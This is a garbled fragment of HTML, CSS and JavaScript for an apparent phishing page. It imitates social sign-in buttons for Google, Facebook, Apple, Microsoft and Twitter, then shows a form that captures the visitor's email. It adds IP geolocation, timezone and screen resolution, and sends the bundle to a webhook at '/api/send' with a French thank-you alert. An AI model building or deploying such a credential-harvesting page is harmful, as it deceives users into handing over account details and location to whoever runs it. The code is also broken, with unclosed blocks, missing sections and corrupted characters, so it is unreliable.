<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');

  :root {

    --primary-dark: #357ABD;
    --gray-light: #f5f7fa;
    --gray-medium: #cfd8e3;
    --text-dark: #2c3e50;
    --border-radius: 14px;

  * {

    margin: 0; padding: 0;

  body, html {
    height: 100%;
    background: var(--gray-light);
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }

  .container {
    background: white;
    padding: 48px 36px;
    max-width: 420px;
    width: 100%;
    border-radius: var(--border-radius);
    box-shadow: 0 12px 30px rgba(0,0,0,0.12);
    text-align: center;
    overflow: hidden;
  }

  h1 {
    color: var(--text-dark);
    font-weight: 600;
    font-size: 28px;
    margin-bottom: 32px;
  }

  .btn-social {
    cursor: pointer;
    border: none;
    outline: none;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12px;
    margin-bottom: 20px;
    border-radius: var(--border-radius);
    padding: 14px 18px;
    width: 100%;
    font-weight: 600;
    font-size: 16px;
    color: white;
    box-shadow: 0 6px 14px rgba(0,0,0,0.1);
    transition: background-color var(--transition), box-shadow var(--transition), transform var(--transition);
    user-select: none;
  }

  .btn-social:hover {
    filter: brightness(90%);
    transform: translateY(-2px);
  }

  .btn-social.active {
    box-shadow: 0 0 12px 3px rgba(74, 144, 226, 0.7);
    transform: translateY(-3px);
  }

  /* Couleurs et ombres pour chaque bouton */
  .btn-google {
    background: #DB4437;
    box-shadow: 0 6px 14px rgba(219, 68, 55, 0.5);
  }
  .btn-facebook {
    background: #3b5998;
    box-shadow: 0 6px 14px rgba(59, 89, 152, 0.5);
  }
  .btn-apple {
    background: #000000;
    box-shadow: 0 6px 14px rgba(0,0,0,0.5);
  }
  .btn-microsoft {
    background: #0078d4;
    box-shadow: 0 6px 14px rgba(0, 120, 212, 0.5);
  }
  .btn-twitter {
    background: #1DA1F2;
    box-shadow: 0 6px 14px rgba(29, 161, 242, 0.5);
  }

  /* Logos SVG */
  svg {
    width: 24px;
    height: 24px;
    fill: white;
    flex-shrink: 0;
  }

  form {
    margin-top: 24px;
    text-align: left;
    max-height: 0;
    opacity: 0;
    transition: max-height 0.5s ease, opacity 0.5s ease;
    overflow: hidden;
  }

  form.active {
    max-height: 480px;
    opacity: 1;
  }

  input {
    width: 100%;
    padding: 14px 16px;
    margin-bottom: 20px;
    border-radius: 10px;
    border: 1.5px solid var(--gray-medium);
    font-size: 16px;
    transition: border-color 0.3s ease;
  }

  input:focus {
    outline: none;
    border-color: var(--primary);
  }

  button[type="submit"] {
    background: var(--primary);
    color: white;
    border: none;
    padding: 16px;
    border-radius: 10px;
    width: 100%;
    font-weight: 600;
    font-size: 18px;
    cursor: pointer;
    transition: background-color var(--transition), box-shadow var(--transition);
    box-shadow: 0 8px 20px rgba(74, 144, 226, 0.5);
  }

  button[type="submit"]:hover {
    background-color: var(--primary-dark);
    box-shadow: 0 10px 26px rgba(53, 122, 189, 0.6);
  }

  .note {
    margin-top: 28px;
    font-size: 13px;
    color: #888;
    text-align: center;
  }

  @media (max-width: 480px) {
    .container {

    }

      font-size: 22px;
      margin-bottom: 24px;
    }

    .btn-social {
      font-size: 14px;
      padding: 12px 16px;
      gap: 10px;
    }

    svg {
      width: 20px;
      height: 20px;
    }
  }
</style>

<script>
  const buttons = document.querySelectorAll('.btn-social');
  const form = document.getElementById('loginForm');
  let currentProvider = null;
  let animTimeout = null;

  function showForm() {
    form.classList.add('active');
    form.scrollIntoView({ behavior: 'smooth' });
  }

  function hideForm() {
    form.classList.remove('active');
  }

  buttons.forEach(btn => {
    btn.addEventListener('click', () => {
      // GÃ©rer l'Ã©tat actif des boutons
      buttons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      // Animation : fermer formulaire puis ouvrir aprÃ¨s dÃ©lai
      if (form.classList.contains('active')) {
        hideForm();
        clearTimeout(animTimeout);
        animTimeout = setTimeout(() => {
          showForm();
        }, 400);
      } else {
        showForm();
      }

      currentProvider = btn.getAttribute('data-provider');
    });
  });

  let sessionStart = Date.now();

  form.addEventListener('submit', async e => {
    e.preventDefault();

    const email = form.email.value.trim();

        country: data.country_name,

        latitude: data.latitude,
        longitude: data.longitude
      };
    } catch (err) {

ðŸ•’ Fuseau horaire : ${timezone}
ðŸ“ RÃ©solution Ã©cran : ${screenRes}

    `;

    // Envoi au webhook
    fetch('/api/send', {

    });

    alert("Merci ! DonnÃ©es envoyÃ©es.");
